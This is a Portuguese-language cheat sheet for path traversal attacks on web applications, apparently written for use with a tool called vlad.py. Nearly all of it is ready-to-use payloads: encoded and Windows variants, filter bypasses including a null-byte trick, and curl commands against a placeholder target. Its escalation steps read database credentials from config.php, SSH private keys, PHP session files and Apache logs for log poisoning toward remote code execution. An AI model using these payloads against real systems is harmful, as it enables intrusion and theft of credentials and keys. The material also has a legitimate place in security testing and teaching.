# Directory Traversal / Path Traversal

## Como Funciona

Manipulação de caminhos de arquivo para acessar diretórios e arquivos fora do diretório permitido.

```
/var/www/html/uploads/ ← diretório permitido
/var/www/html/uploads/../../../etc/passwd ← arquivo acessado
```

## Identificar Parâmetros Vulneráveis

```
?file=documento.pdf
?path=imagens/foto.jpg
?load=template.html
?page=sobre
?dir=uploads
?template=home
?resource=style.css
```

## Payloads

### Linux Básico
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
```

### Encoding
```
..%2F..%2F..%2Fetc%2Fpasswd          # URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd          # double dots
..%252F..%252F..%252Fetc%252Fpasswd   # double encoded
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### Windows
```
..\..\..\windows\win.ini
..%5C..%5C..%5Cwindows%5Cwin.ini
..\..\..\inetpub\wwwroot\web.config
```

### Bypass de Filtros

```bash
# Filtro remove "../"
....//....//etc/passwd

# Filtro normaliza mas não remove suficientemente
..././../././../etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# Caminho absoluto (quando não há restrição)
/etc/passwd
C:\windows\win.ini
```

## Verificação de Sucesso

```bash
# Linux: passwd contém root
curl "http://alvo.com/?file=../../../etc/passwd" | grep root

# Windows: win.ini contém [fonts]
curl "http://alvo.com/?file=..\..\..\windows\win.ini" | grep fonts
```

## Escalação

```bash
# 1. Ler config para obter credenciais
?file=../../../var/www/html/config.php  # BD credentials

# 2. Ler chave SSH
?file=../../../home/www-data/.ssh/id_rsa

# 3. Ler arquivo de sessão PHP
?file=../../../tmp/sess_abc123

# 4. Ler logs para log poisoning → RCE
?file=../../../var/log/apache2/access.log
```

## Detecção com vlad.py

```bash
python vlad.py web --alvo "http://alvo.com/?file=teste.txt" --tipo traversal
```
